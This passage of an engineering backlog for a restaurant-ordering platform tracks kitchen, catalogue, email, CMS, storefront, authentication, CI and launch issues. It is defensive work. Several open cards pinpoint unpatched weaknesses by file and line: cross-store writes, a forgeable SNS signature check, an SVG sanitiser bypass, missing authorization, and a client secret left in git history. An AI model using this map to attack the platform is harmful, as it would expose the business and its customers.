  `updateStoreStatus` never sent the `paused_until` the contract requires — and a green test
  asserted that broken payload. Menu sync now propagates stock instead of filtering on
  `isActive` alone.
- [x] **Menu sync fans out on every product edit.** Measured: a 50-product import queued
  **100** sweeps, each pushing every store's menu. Now 2, scoped to the store actually
  edited, coalesced through the existing `rateLimits` table. Both clients gained 429/5xx
  backoff with jitter honouring `Retry-After`; Deliveroo's token cache never hit at all,
  because it demanded 5 minutes of life from a 300-second token.
- [x] **Sandbox flags default to production, read in 20 files.** Measured: **37 read sites
  across 25 files**, not 20. Centralised in `@be-yours/core/env`.
- [x] **Deliveroo failures are acknowledged as 200.** The handler now returns 500 when
  processing genuinely failed so Deliveroo retries, and keeps 200 for duplicates and
  unhandled events, which must never be retried. An unclassified failure fails safe toward
  retry.
- [x] **The Deliveroo e2e suite cannot sign correctly.** It signed the body alone while the
  verifier requires `sequenceGuid + " " + body`; the GUID was generated *after* the
  signature. Every one of those webhooks got a 401, and with the env vars unset the suite
  skipped — so a signature that could never be accepted looked exactly like a green run. The
  skip is now loud, and a no-network test pins the digest against a value computed with
  `openssl`, not with repo code.

### Also fixed, found by adversarial verification rather than by the cards

- [x] **An Uber cancellation left the kitchen ticket live.** Cancelling the order patched the
  order row only: the ticket stayed `pending`, stayed on the pass, and **stayed in the print
  queue**. `updateStatus` (the staff path) had always cascaded to the ticket;
  `updateFromWebhook` — the path every platform cancellation takes — is a different handler
  and never did. A comment in `updateStatus` claimed "every path into a status change goes
  through this handler ... the Deliveroo webhooks", which was simply untrue. Now one
  `cancelKitchenTicketsForOrder`, called from both.
- [x] **A cancellation for an order past `confirmed` was silently swallowed.** The first fix
  applied `ORDER_STATUS_TRANSITIONS` to inbound notifications. That table stops the
  cancellation window at `confirmed` for an **outbound** reason — Deliveroo refuses to cancel
  food already being made — and applying it inbound meant a customer cancelling a `preparing`
  order got HTTP 200, no change, and a kitchen that carried on cooking. A platform
  cancellation is a fact, not a request: `refusePlatformStatus` now honours it from any status
  where stopping still means something, and records the ones that arrive after delivery.

---

## TECH-05 · Kitchen — stations, locks and print reliability — **RESOLVED**
**Priority:** high · **Parent:** #100

> **Resolved 2026-09-04** (#164, PR #311). Nine of nine, with two of them closed on the
> storefront path only — said plainly under the last two bullets rather than counted as
> whole. Sub-point 9 is the one that had gone backwards: the tab was *deleted* rather than
> lifted, so `printConfig.enabled` could not be turned on by anyone and every ticket was
> stamped `not_required`. Automatic printing was not unreachable, it was dead product-wide.

- [x] **Multi-station routing does not exist.** — **RESOLVED.** `stationMapping` is a
  schema field (`tables/stores.ts`), written by `stores.updateStationMapping` from the
  store-detail kitchen tab, and read by `resolveStations` on every release: an order is
  split into one ticket per station it touches, each slip carrying its own allergens and
  prep time, all of them sharing one tracking token so no station can tell the customer
  their food is ready before the slowest one has. The KDS station filter renders off
  `ticket.station`, which now has a production writer. Collapsing the split fails 3 tests.
- [x] **Two open tablets print every ticket twice.** — **RESOLVED.** `claimForPrint` flips
  `pending → printing` in one transaction and returns a claim id; `markPrintSent` refuses a
  claim the tablet no longer holds. An expired claim — the dialog nobody answered — returns
  the slip to the queue.
- [x] **A failed print is never retried.** — **RESOLVED.** `getPrintQueue` returns failed
  tickets whose retry delay has elapsed, up to `MAX_PRINT_ATTEMPTS`, alongside pending ones
  and expired claims. `printAttempts` is read now, by `isRetryable` and by the alarm.
- [x] **Blank slips can print and be recorded as successful.** — **RESOLVED.** The trigger
  commits with `flushSync` rather than waiting 100 ms on an asynchronous React 19 commit,
  and refuses to print a slip whose content is not there.
- [x] **The overdue alarm can never fire.** — **RESOLVED on the storefront path.**
  `releaseToKitchen` passes `summary.estimatedPrepTime`, computed from the ordered
  products, so `estimatedReadyAt` exists and the alarm can fire. **The Uber Eats webhook
  still passes neither**: it builds its own ticket, and its lines carry `productName` and
  `externalId` but no internal `productId`, so nothing can be looked up without resolving
  them through `externalProductMappings` first. A platform order therefore cannot arm the
  alarm. That resolution is delivery-surface work, not this card's.
- [x] **The allergen block on the ticket is only ever populated by demo data.** —
  **RESOLVED on the storefront path.** `summariseOrderLines` gathers the allergens of every
  product in the order and `releaseToKitchen` writes them per station. Same platform
  exception as the bullet above, and it matters more here: an Uber Eats slip prints without
  its allergen block. The customer's own typed note *does* survive on that path (P0-11) —
  it is the product-derived allergen list that does not.
- [x] **"Manual confirmation" is a saved setting nothing reads.** — **RESOLVED.**
  `releaseToKitchen` reads `store.orderConfirmation`: "auto" and unset release on payment,
  "manual" holds the order until staff accept it. Staff accepting by hand *is* the manual
  workflow, so it skips the setting — and only the setting, never the payment gate.
- [x] **Choosing a "cloud" printer silently disables printing.** — **RESOLVED.** The three
  cloud providers are offered `disabled`, with the reason beside them. They stay listed
  rather than removed: the schema still accepts them, and an establishment already holding
  one deserves to see which.
- [x] **Print configuration is unreachable from the engine.** — **RESOLVED.** The tab lives
  in `packages/admin` (`pages/stores/store-kitchen-tab.tsx`), rendered by `StoreDetailPage`,
  which both apps mount at `/dashboard/stores/[storeId]`. `updatePrintConfig`,
  `updateStationMapping` and `updateOrderConfirmation` all have callers and app wrappers in
  both apps. Proven end to end by "a paid order prints automatically", which writes
  `printConfig` through the real guarded mutation and then reads `printStatus: "pending"`.

---

## TECH-06 · Catalogue — cross-store scope and dead fields
**Priority:** high · **Parent:** #105

- [ ] **`updateWithPropagation` writes into stores the caller does not administer.**
  `products.ts:690-691` — authorization covers only the store of the named product, then
  the handler patches every linked twin with no per-store check. The mutation is public.
  It also skips the `price < 0` guard present at `:368`.
- [ ] **`externalProductMappings.upsert` can overwrite another store's mapping.**
  `externalProductMappings.ts:83-99` — authorized on `args.storeId`, but the lookup is
  `by_internal` on `(internalProductId, platform)` with no check that the product belongs
  to that store, then `patch`. Product ids of any store are public via `api.products.list`.
- [ ] **`duplicateCatalog` throws on any store that has categories.**
  `products.ts:544-552` writes `image: cat.image` (the field is `imageUrl`) and omits the
  required `createdAt`/`updatedAt`. The test `authorization.test.ts:761-773` passes only
  because the source store has no categories.
- [ ] **Deleting a category orphans its products.** `categories.ts:138-142` is a bare
  `ctx.db.delete`, while `categories-page.tsx:250-251` promises "products will lose their
  category assignment". They keep a dead `categoryId`, stay orderable under "All", and
  render as "Inconnu" in the admin.
- [ ] **Per-product `taxRate` is collected and never applied.** Required at creation
  (`products.ts:239`), edited under "Taux de TVA (%)", read only by the two platform
  mappers. See P0-03.
- [ ] **`categoryId` is never checked against the product's store**
  (`products.ts:230-305` and `:310-374`); same for menu sections (`menus.ts:43-113`) and
  `orphanProducts.ts:79-91`.
- [ ] **Products have no orderable sort.** `sortOrder` is in the form schema (`:79`) with
  no input, and there is no reorder UI (categories have one).
- [ ] **Clearing the VAT field makes the save fail** with a generic toast
  (`product-form.tsx:42` yields `undefined`, the validator requires `v.number()`).

---

## TECH-07 · Email marketing — compliance, throughput and automations
**Priority:** high · **Parent:** #109

- [ ] **No `List-Unsubscribe` / `List-Unsubscribe-Post` headers.**
  `emailCampaignActions.ts:136-160` sets only three `X-` headers. Gmail and Yahoo have
  required one-click unsubscribe for bulk senders since February 2024; without it, bulk
  mail is filtered or rejected.
- [ ] **Unsubscribe is a mutating GET with no confirmation.**
  `emailHttpHandlers.ts:50-77` — Outlook Safe Links, corporate scanners and the Gmail
  image proxy fetch links in delivered mail, **unsubscribing paying customers** who never
  clicked. The `catch` (`:65-68`) also renders "Désabonnement confirmé" on failure.
  → confirmation page on GET, mutation on POST.
- [ ] **SNS signature is not verified.** `emailHttpHandlers.ts:178-207` —
  `isValidSNSOrigin` only pattern-matches `SigningCertURL` **inside the caller-supplied
  body**; the certificate is never fetched and the signature never checked. A recipient
  can forge a complaint against another subscriber. Tracked as S3-3.
- [ ] **Sending is unbatched and unresumable.** `emailCampaignActions.ts:123-184` is a
  synchronous loop invoked from the browser, with 100 ms plus one SES call and **two**
  `runMutation` round-trips per subscriber. Around 3,000 subscribers the action exceeds
  the Convex time limit, the campaign is stuck at `sending`, and the only exit is
  "Relancer" — which triggers the duplicate send in P0-20.
- [x] **Automations have no execution engine.** `emailAutomations.ts` is CRUD only;
  nothing dispatches on the `welcome` / `birthday` / `inactive` / `post_order` /
  `abandoned_cart` triggers, while `emailConfig.ts:23-29` exposes five toggles in the UI.
  → Engine landed; `welcome`, `post_order` and `inactive` dispatch. `birthday` and
  `abandoned_cart` cannot: **no record anywhere carries a date of birth**, and the cart
  is a browser-local Zustand store that is never persisted. Both are marked
  `ready: false` in `TRIGGER_READINESS`, `canDispatch` refuses them, and the admin now
  renders their switches disabled with the reason — derived from `TRIGGER_READINESS`
  rather than a second hard-coded list, so a toggle re-enables itself the day its trigger
  is wired. Carded separately below.
- [ ] **A/B testing is collected and never applied.** `emailCampaignActions.ts:145` uses
  `campaign.subject` for everyone; `campaign.variants` is never read and
  `emailEvents.metadata.variantId` is never written.
- [ ] **`maxEmailsPerWeek` is never enforced** (`tables/emailMarketing.ts:539`), despite
  being presented as an anti-spam guard.
- [ ] **`/api/contact` is an unauthenticated, unthrottled SES relay.**
  `apps/reference/app/api/contact/route.ts:9-26` — no caller (the form uses
  `contactMessages.create`), but the route is live.
  → delete it, or add IP rate limiting and field-length caps.
- [ ] **Public mutations have no rate limiting** (`emailSubscribers.ts:80-93`,
  `contactMessages.ts:18-24`, both annotated "tracked as S3-7"), with an unbounded
  `message: v.string()` and a `list` that `.collect()`s without pagination.
- [ ] **Double opt-in tokens come from `Math.random()`**
  (`emailSubscribers.ts:141-143`) while `double-opt-in.ts:26` provides
  `crypto.randomUUID()`; and `importBatch` accepts the token **from the caller**.

---

## TECH-08 · CMS and media library — quotas, scope and rendering
**Priority:** high · **Parent:** #97

- [ ] **`generateArticle` and `generateImage` never authorize their `storeId`.**
  `blogAutoGenerate.ts:333-370` and `blogImageGenerate.ts:51-73` carry a
  `@guarded-inline` marker asserting a check that does not exist: `_checkAccess` takes
  only `{ownerId}`. The false marker **silences the linter** built to catch this. The
  sibling `blogAutoConfig.ts:86-93` was already fixed.
- [ ] **Quota is checked, then incremented after the OpenAI call.**
  `blogAutoGenerate.ts:358-364` (check) versus `:244` (final increment): 100 concurrent
  calls all pass. And the article's own image generations (up to 4 × `gpt-image-1`)
  **bypass the image quota entirely**.
  → reserve quota before the first paid call, release on failure.
- [ ] **The Enterprise multi-language gate is UI-only.** `blogAutoGenerate.ts:345,617`
  passes `autoTranslate` without checking `allowMultiLanguage`; the only guard is a
  disabled `<Switch>`. `tasks/auto-blog-spec.md:266-271` explicitly forbids this.
- [ ] **The SVG sanitiser is bypassable via the presigned path.** `createMedia` accepts
  `mimeType`/`kind`/`size` with no server-side validation (`validateMediaUpload` is
  imported only in the browser), `getPresignedUrlForMedia` presigns with that `mimeType`,
  and `confirmUpload` routes `image/svg+xml` around sharp straight to `setMediaReady`.
  There is no server-side size cap either.
- [ ] **`X-Frame-Options: DENY` breaks the CMS preview.** `next.config.ts:17` applies
  `DENY` to `/(.*)`, and `PreviewClient.tsx:44` renders the storefront in an `<iframe>` —
  blocked even same-origin. The frame is permanently blank. `cms-preview.spec.ts:20-23`
  cannot fail.
  → `frame-ancestors 'self'` via CSP, or `SAMEORIGIN`.
- [ ] **Rich-text content renders escaped on the public site.** Four `richtext` fields
  (`about.ts:50-54`, `sign-in.ts:20`, `sign-up.ts:20`, `game.ts:44`) store
  `editor.getHTML()`, and `AboutContent.tsx:161` renders it as a React child: the visitor
  reads the `<strong>` tags.
  → either sanitise on write and render as HTML, or move these fields to `type: "text"`.
  **Do not add the render without the sanitiser.**
- [ ] **Deleting media does not delete the file.** `cmsMedia.ts:157` removes only the
  Convex row; `DeleteObjectCommand` appears nowhere. A GDPR erasure request cannot be
  satisfied.
- [ ] **Hand-authored article HTML is never sanitised** (`blog.ts:456-460`,
  `blogPublish.ts:107`) — only the AI path is. Latent today, live the moment P0-25 lands.

---

## TECH-09 · Storefront — SEO, accessibility and the buying path
**Priority:** high · **Parent:** #96

- [ ] **The entire CMS SEO block is dead.** `lib/cms/seo.ts:28-29` short-circuits on a
  `storeSlug` cookie that **nobody writes** (a leftover of a removed `/s/[storeSlug]`
  architecture). Eight pages expose `metaTitle`, `metaDescription`, `ogImage`, `robots` —
  none reaches the `<head>`. Two more bugs in the same 30 lines: `:44` computes
  `index: robots.includes("index")` — and `"noindex"` **contains** `"index"`, so
  "Noindex, Nofollow" emits `{index:true, follow:true}`; and `:31` reads a `locale`
  cookie while the app writes `beid_locale`.
- [ ] **Five of eleven public routes cannot carry metadata** — `/menu`, `/cart`,
  `/store-selector`, `/account/*`, `/order/[orderId]`, `/track/[token]` are client
  components. `/menu` is the highest-intent page and it has an SEO block in the CMS.
- [ ] **The sitemap lists only URLs that do not exist** (`sitemap.ts:44-57` emits
  `/s/{slug}`), and `robots.ts` disallows neither `/account/`, `/cart` nor `/checkout`.
- [ ] **Structured data is written and never rendered.** `lib/json-ld.tsx` has no caller;
  there is no `application/ld+json` in `app/`. For a restaurant theme this is what
  produces opening hours and price range in rich results.
- [ ] **The footer newsletter form throws the email away.**
  `storefront-footer.tsx:29-34` toasts "Merci ! Vous êtes maintenant inscrit" without
  calling any mutation. The correct call exists one page over (`BlogContent.tsx:87`). The
  footer renders on **every** page.
- [ ] **The account "Préférences" tab is inert** — the apply button has no `onClick`
  (`account/page.tsx:729-734`).
- [ ] **Keyboard users cannot select a required option**, so cannot buy a configurable
  dish: the choice row is a `<div onClick>` and the radio a `<div>` with no `input`,
  `role`, `tabIndex` or key handler (`product-detail-client.tsx:233-252`).
- [ ] **Clicking a multi-select option's checkbox does nothing** — the native
  `<Checkbox>`'s `onCheckedChange` and the parent `<div>`'s `onClick` toggle in sequence.
- [ ] **The cart drawer is neither a dialog nor hidden** — no `role="dialog"`, no focus
  trap, no Escape, and it is **rendered permanently** (merely translated off-screen) with
  no `inert`: its controls stay in the tab order of every page.
- [ ] **Saved addresses lose their coordinates**
  (`address-manager.tsx:101-107` drops `latitude`/`longitude`) while checkout keeps them:
  the same address yields two different delivery quotes.
- [ ] **Contrast fails WCAG AA on body text** — `text-zinc-400` on white is 2.56:1; the
  search placeholder 1.48:1; the orange "Lire la suite" 2.80:1.
- [ ] **Product images bypass `next/image`** — raw `<img>` on full-size S3 originals,
  12 per menu page, with no resizing, AVIF/WebP or lazy loading.

---

## TECH-10 · Multi-store — cascade, timezone and dead settings
**Priority:** high · **Parent:** #94

- [ ] **Restoring a backup detaches the whole database from its store.**
  `systemInternal.ts:92-113` — `importTable` deletes then re-inserts without `_id`, so
  stores come back with **new** ids while products, menus, CMS pages and promotions come
  back carrying the **old** `storeId`. `v.id("stores")` validates only the encoding, so
  the inserts succeed silently. Orders, payments, tickets, team members and profiles are
  neither exported nor imported — they now point at deleted stores, and since
  `userProfiles.storeIds` no longer matches anything, **the owner loses access to
  everything**. Irreversible.
  → a two-pass old-id → new-id map rewriting every foreign key before inserting
  dependants; or refuse the import on a non-empty deployment.
- [ ] **Deleting a store deletes only the store row** (`stores.ts:383-398`): ~42
  `storeId` columns across 20 tables are left dangling, and the id stays in
  `userProfiles.storeIds`. Bulk delete does this for N stores at once.
- [ ] **"Closed" and "Temporarily unavailable" are enforced in the browser only.**
  `orders.create:295-301` checks `isPublishedStore` alone, and both `closed` and
  `temporarily_unavailable` are *published* statuses.
- [ ] **Timezone is a setting nobody reads.** `globalSettings.timezone` is written and
  never read; open/closed is computed from `now.getDay()` / `now.getHours()`, i.e. the
  visitor's clock — spoofable, and wrong when travelling.
- [ ] **"Use global hours" changes nothing on the storefront.**
  `use-store-detail.ts:207-226` does not write `store.hours` when the flag is on, and
  `use-store-status.ts:25-27` reads only `store.hours`. `stores.create` seeds a
  hard-coded 09:00–22:00.
- [ ] **Global service toggles are ignored** — `null` is treated as "show everything"
  (`order-type-selector.tsx:31`), and `orders.create` does not validate `args.type`.
- [ ] **Saving the Integrations tab wipes the stored Uber Direct credentials.**
  `use-settings-form.ts:16,116-121,404-412` reads `api.globalSettings.get` — the
  **public** query that strips `customerId`/`clientId`/`clientSecret`/`apiKey` — so the
  fields initialise empty and `upsert` patches the whole object.
  → read `getAdmin`, or merge field by field.
- [ ] **The #119 fix is incomplete.** `team-page.tsx:50,63-66` passes the raw persisted
  `storeId` to a `v.id("stores")` validator, and `/dashboard/team` is in `StoreGuard`'s
  `BYPASS_ROUTES`. Same shape as the bug that was fixed.
- [ ] **`stores.getById` is public and returns drafts** — address, contact, `orderMode`
  and `overrides` of an unpublished establishment.
- [x] **Three dead settings**: `orderConfirmation`, `soundConfig`, `displayConfig` —
  mutations and audit entries wired, with no reader or writer.
  *Wrong on all three, and measurement said so. `soundConfig` is read by
  `KitchenContent` and written by the kitchen tab since #243; `orderConfirmation`
  is read by `releaseToKitchen` and written since #164; `displayConfig` is read by
  `kitchenTickets.getForDisplay` on the customer-facing dining-room screen and had
  been the whole time — 74de4e9 deleted its mutation on this card, leaving a live
  setting no owner could change. Writer, schema type and editor restored in Q-2.*

---

## TECH-11 · Authentication — sessions, errors and permissions
**Priority:** high · **Parent:** #113

- [ ] **A signed-in customer who opens `/dashboard` crashes the app.**
  `auth-guard.tsx:17-45` checks authentication but not role; `StoreGuard` then fires
  `stores.listAll` (`requireStaff`), which throws, and `useQuery` **rethrows during
  render**. There is no `error.tsx` in the repo. Same white screen for any staff member
  reaching a page above their permission, and for an owner whose `userProfiles` row does
  not exist yet.
- [ ] **Password change reports success on a wrong current password.**
  `account/page.tsx:328-338` ignores `{ data, error }` — the Better Auth client does not
  throw. Every other call site knows this (`sign-in`, `sign-up`, `forgot-password`,
  `reset-password`). The user believes the password changed and locks themselves out.
  Same shape on `authClient.updateUser` (`:301`).
- [ ] **A password reset does not revoke existing sessions.**
  `revokeSessionsOnPasswordReset` is absent from `emailAndPassword`, while the in-app
  change does pass `revokeOtherSessions: true`. A stolen session stays valid for up to
  7 days after the reset.
- [ ] **The password-reset email fails silently.** `auth.ts:33-52` does
  `if (!siteUrl || !secret) return;` with no log, and never checks the response status.
  Both variables live on the Convex side, which `instrumentation.ts` does not inspect.
- [x] **The first administrator cannot be created from the product.** — **RESOLVED**
  `claimFirstAdmin` requires an undocumented `ADMIN_BOOTSTRAP_TOKEN` and has no caller;
  nothing provisions `userProfiles` on sign-up, so `getAuthUser` throws
  "User profile not found" on every admin screen.
  → a one-time `/setup` page, or a documented step in `apps/docs/deployment/`.
  Both, in the end. `app/(auth)/setup/page.tsx` exists in each app and calls the mutation,
  rendering one of four states off `bootstrapStatus`; the token is documented in
  `apps/docs/deployment/first-administrator.md`, both `.env` templates and the screen
  itself. `getAuthUser` still throws `no_profile` — that is the designed state of every
  account before the seat is claimed, and `/setup` is what explains it rather than a white
  screen. The claim fails closed when the variable is unset, mints exactly one seat, and is
  self-closing; held by `apps/*/tests/convex/authorization.test.ts`.
- [ ] **Per-module permissions are never enforced.** The invite dialog offers eight
  checkboxes, stores them in `teamMembers.permissions`, and **nothing reads them**:
  `invitationGrant` does not carry them across, acceptance writes
  `permissions: existingProfile?.permissions ?? []`, and `hasPermission` is role-only.
  The owner believes they restricted access; they restricted nothing.
  → either remove the checkboxes, or thread them through to `requireStorePermission`.
- [ ] **Any staff role can list the whole chain.** `stores.listAll` is gated on
  `requireStaff` alone, without membership: a kitchen account gets the name, address,
  phone, email, hours and radius of every establishment. Already filed as #94.
- [ ] **Every authorization denial reaches the user as "Server Error".** `ConvexError`
  is used **nowhere** in the repo: Convex redacts ordinary thrown messages in production,
  while the UI displays `error.message`. Every denial looks like a bug.

---

## TECH-12 · Delivery chain — CI, tests and template parity
**Priority:** high · **Parent:** #102

- [ ] **CI can be green while the Convex backend does not compile.**
  `apps/*/tsconfig.json` excludes `convex/` — **102 files per app never type-checked** —
  and `next build` does not touch them either. No workflow runs `convex deploy`,
  `convex codegen` or `tsc -p convex/tsconfig.json`.
  (Verified: the `"use node"` directive is clean today — 93 files, none exporting a
  `query`/`mutation` — but nothing will warn when that changes.)
  → a CI job running `convex deploy --dry-run`, or
  `tsc -p apps/*/convex/tsconfig.json --noEmit`.
- [ ] **`release.yml` publishes without waiting for CI.** Triggered on `push` to `main`
  with **no `needs:`**, it runs `changeset publish` after a bare package build — no lint,
  no type-check, no tests. A failing test does not stop publication to GitHub Packages,
  nor the mirror to `beyours-boilerplate`.
- [ ] **E2E never runs.** `e2e.yml:14` is gated on
  `vars.CONVEX_E2E_ENABLED == 'true'`; with the variable unset the job is skipped.
  (The honesty fix did land: `cancelled` and `failure` now exit 1 — but a 510-test suite
  that is switched off protects nothing.) Also `e2e.yml:95` does
  `npx tsx scripts/seed-users.mts || true`.
- [ ] **The shipped template runs 3 of its 14 test files.**
  `apps/themes/vitest.config.ts:9` excludes `**/e2e/**` wholesale, hiding the **11
  Deliveroo suites**. `apps/reference/vitest.config.ts:16-20` fixed exactly this bug with
  a comment explaining it — never propagated.
  → copy the `exclude` array from `reference`.
- [ ] **Authorization suites never run against the shipped app.**
  `apps/themes/tests/convex/` **does not exist**; the five suites (including the
  832-line `authorization.test.ts`) cover only the test bench, while
  `apps/themes/convex/` is the file set an integrator edits per client.
  → add `convex-test` + `@edge-runtime/vm` and copy `tests/convex/`.
- [ ] **6,449 lines of dead admin components ship to every client.**
  39 files under `apps/themes/components/admin/{dashboard,design,games,orders,payments,products,settings,stores,team}/`,
  with **zero importers** — the pages import from `@be-yours/admin`. An integrator
  customising the orders table edits a file with no effect.
- [ ] **French accents stripped across the shipped admin.** 188 accented characters in
  `reference` versus 53 in `themes`, on visible strings: "Commande prete",
  "Article publie", "Echec de la mise a jour".
  → take `reference`'s strings and add a CI check.
- [ ] **`apps/themes` points at an image that is not in the repo.**
  `HomepageContent.tsx:80` and `meal-card.tsx:74` fall back to
  `/imagery/hero-burger-v2.png`; `apps/themes/public/` holds only five SVGs. The
  optimizer returns 400 on the hero and on every product without a photo.
  `apps/reference` was already fixed — drift in the wrong direction.
- [ ] **The update check can never report a release.** `system.ts:352-356` fetches
  `registry.npmjs.org/@be-yours/restaurant-theme`, a package that does not exist
  (everything is on GitHub Packages). The catalogue stays empty, so a lapsed maintenance
  contract is never enforced and a real update is never announced. The file's own
  `TODO(beyours)` says so.
- [ ] **Five demos cannot be installed.**
  `demos/s/{pizzeria-trattoria,fast-food-smash,food-truck-convoi,poulet-braise,asiatique-izakaya}.html`
  exist in the sales gallery; `pnpm template:apply <slug>` answers "Template inconnu"
  (they live under the legacy slugs).
- [ ] **`packages/mcp-server` is an orphaned stub** — v1.0.1, 3 sources, no consumer, and
  no `test`/`lint`/`type-check` script, so Turbo never touches it.
- [ ] **`apps/site` has no security headers** (`next.config.ts` is empty) while hosting
  the ops console and the affiliate portal with electronic signatures. No HSTS, no
  `X-Frame-Options`, no `nosniff`.
- [x] ~~**Sentry is dead code.**~~ **Done.** It was true when written: `@sentry/nextjs` was
  in no `package.json` while `NEXT_PUBLIC_SENTRY_DSN` sat in the schema and both
  `.env.example` files, so an operator configured monitoring that did not exist. It is now
  `^10.71.0` in all three apps (`apps/reference`, `apps/themes`, `apps/site`), wired by
  #368 — which also ruled that a `console.error` into the Convex dashboard's expiring log
  window is not a failure record, and gave `apps/*/convex/errorReporting.ts` a backend
  reporter. `apps/docs/deployment/sentry.md` carries the per-client project layout.

---
---

# `LAUNCH` — operator actions and product decisions

Outside the repo: none of this is fixed by writing code.

## LAUNCH-01 · Rotate the exposed Deliveroo secret — **urgent, still open**
The `client_secret` is still readable in git history. Re-measured 2026-09-04 by execution,
because the previous figures here were wrong in the direction that matters:

- **137 commits** across all local refs contain it; **41 are ancestors of `main`** (published).
  The old "18 commits" counted `test-config.ts` alone and omitted
  `scripts/deliveroo-menu-scenarios.sh`, where it lived longest — understated 2.3x against
  published history.
- 96 more are local-only, on the pre-monorepo lineage this clone keeps under
  `archive/main-avant-monorepo` and 34 stale tags. A fresh clone of origin will not touch them.
- The working tree is clean. One distinct secret value; no prior rotation.
- First seen `7cf4d41` (2026-03-11, at **lines 9-10**, not 33-34), last `9e751d5` (2026-06-02).

**Detection is fixed; rotation is not.** `.gitleaks.toml` now carries
`deliveroo-client-secret-context` and `deliveroo-client-secret-shape`. Before them no rule
matched: it is a bare 52-character base36 token, and the leak placed it after `:-` in a shell
default and after `|| "` in TypeScript, neither of which the stock generic-api-key rule reads
as an assignment. Validated across all 7,459 blobs in the object store — 3 matching blobs, one
distinct token, zero false positives at HEAD (2,655 files) or in history.

**Scan posture — settled in #337, merged 4 Sep 2026.** #315 made the job red on `main` itself
on every run. #337 then accepted the four findings *by fingerprint* — commit, file, rule and
line — so a **fifth** leak shows up instead of arriving as one more line in a permanently red
list. Scoped that narrowly on purpose: a new secret in either file, or on another line, still
fails the scan. The job is not one of the five required checks (Lint, Type Check, Test, Build,
E2E Status), so neither red nor green ever blocked a merge — which is what makes this a
question about signal, not about gating.

**A green Gitleaks run is still not evidence the history is clean.** The four entries are the
scanner's memory of a leak nobody has cleaned; `.gitleaksignore` says so at the entry, and they
come out when Part B rewrites the history.

An earlier version of this card said "do **not** silence it in `.gitleaksignore`". It was
written in #315 eighteen hours before #337 reversed it, and was never updated. Corrected
2026-09-09.

Verified by execution, not by reading, on a synthetic repository reproducing the same two
paths and syntactic positions with a fabricated token, under the pinned gitleaks 8.21.2: no
ignore file → **4** findings, exit 1; the four fingerprints → **0**, exit 0; a fifth
occurrence added on a new line → **1**, exit 1. That last number is the one that matters —
it is the claim "a fifth leak still shows up", measured rather than asserted.

Mandatory order, unchanged: regenerate in the Deliveroo portal → propagate
(`npx convex env set … --prod`) → re-verify → revoke the old one. Then part B of
`tasks/secret-rotation-runbook.md` (history rewrite).

Cost of the rewrite, re-measured 2026-09-09 on a full (un-shallowed) clone: **472 commits on
`main`, 72 remote branches, 75 tags** — 63 of the tags being the `@be-in-digital/*` release
anchors (the old scope, and still the only one carrying tags: the #572 rename publishes
nothing while `RELEASE_HOLD.md` stands). That is up from the 393 / 8 / 59-of-60 recorded on 4 Sep, and it grows every week the
decision waits. The blocker that deferred it last time has mostly expired: **2 open PRs**
(#420, #421 — both drafts opened 2026-09-09), down from 14. A draft PR's SHAs are invalidated
by a rewrite exactly like a ready one, which is why this number is tracked at all, so land or
close those two before Part B rather than treating the queue as empty.

Two figures worth keeping straight, both measured today rather than inherited:
`7cf4d41` **is** an ancestor of `origin/main`, and **41 commits on `origin/main`** carry a bare
52-character base36 token in one of the two leaked paths — 41 via
`scripts/deliveroo-menu-scenarios.sh`, 9 via `apps/restaurant-theme/e2e/deliveroo/test-config.ts`.
The 41 is exact and confirms the 4 Sep count. But `c0f09cb`, which carries two of the *JWT*
fingerprints above, does not exist in `origin` at all — so those two lines are inert against
any fresh clone.

## LAUNCH-02 · Create the founders coupon and the 4 maintenance prices in Stripe — **urgent**
Without them the **first Essentielle sale is refused by the code** —
`foundersOffer.ts:55-88` throws `FoundersOfferUnavailableError` when
`STRIPE_FOUNDERS_COUPON_ID` or `STRIPE_PRODUCT_CREATION_ESSENTIELLE` is unset, and
`stripe.ts:35-54` refuses checkout before the order exists when any
`STRIPE_PRICE_{ESSENTIELLE,PREMIUM}_{MONTHLY,YEARLY}` is missing. Deliberate and correct
behaviour: the customer is never charged for a plan that cannot be billed.
Coupon: `max_redemptions: 10`, `applies_to` the creation product.

**Two of the four prices are Premium's, and Premium is closed** (LAUNCH-04):
`createCheckoutSession` refuses the plan before it reads any Price ID, so
`STRIPE_PRICE_PREMIUM_{MONTHLY,YEARLY}` gate nothing today. Create them with the
others if it is one sitting — but the urgent pair is Essentielle's. Creating
Premium's prices does **not** reopen the plan; only
`planAvailability.premium = "open"` does, and that belongs in the commit that
ships the application.
**Do not act on the instruction this line used to carry.** It said to fix
`tasks/production-checklist.md`, "which instructs setting six `STRIPE_BID_PRICE_*`
variables that no code reads". That is inverted, and acting on it would have
unset live variables: all six **are** read.
`packages/convex-functions/src/bidSubscription.ts:36-41` declares them and
`buildPriceMap` (`:45-51`) maps each to a plan; `apps/*/convex/bidSubscription.ts:70`
and `:267` feed them from `process.env`. A grep under `apps/*/convex` misses them
because they are never named there — which is how the claim was formed.
`tasks/production-checklist.md:72-76` already carries the correction, "**do not
prune them**", verified 2026-09-03. Re-verified 2026-09-09.

## LAUNCH-03 · Settle the VAT regime — **urgent**
Product decision that gates P0-03. French B2C requires tax-inclusive display; the code
adds VAT on top of the displayed price under a "TVA incluse" label. Decide, then
propagate: engine, commercial site (`apps/site/lib/legal/company.ts` declares
`VAT.regime = "reel"` while `STRIPE_TAX_ENABLED` is off — `invoiceLegal.ts:117-125`
detects the contradiction, logs it and **does not block**), and invoices already issued.

## LAUNCH-04 · Settle the sold-but-absent features — **decided 5 Sep 2026**

Five promises, not four. Auto Blog is struck (both crons ship in `apps/themes`
and both targets exist), and two more were measured by the sixth pass and belong
here (#330): the native application and table reservations.

The owner decided each one. What follows is the decision and what shipped for it.

### 1 · Native iOS & Android app (Premium) — **sell it honestly as « à venir »**

Premium's whole €4 000 creation delta and €1 000/yr maintenance delta is the app.
What exists is `apps/themes/.template/mobile`, one screen reading
`"App mobile — placeholder"`, outside the pnpm workspace, never built or
submitted. No PWA either.

The badge existed and gated nothing: `/checkout?plan=premium` — the route
`PROCESS_DE_VENTE.md` handed buyers — reached `createCheckoutSession`, which
accepted `plan: "premium"` as a first-class literal.

Shipped: `apps/site/convex/planAvailability.ts` is now the single source both
the pricing card and the checkout read. The action refuses a closed plan first,
ahead of every env-dependent check, so it refuses in test mode too. The three
comparison rows moved from `premium: true` to a new `"planned"` status, the FAQ
no longer answers « est-elle déjà disponible ? » in the affirmative, the
`/fonctionnalites` feature carries an « À venir » badge, and the sales playbook
says not to quote Premium. `tests/convex/planAvailability.test.ts` holds it,
including a structural rule: **no plan may be open while it still advertises a
`"planned"` row.**

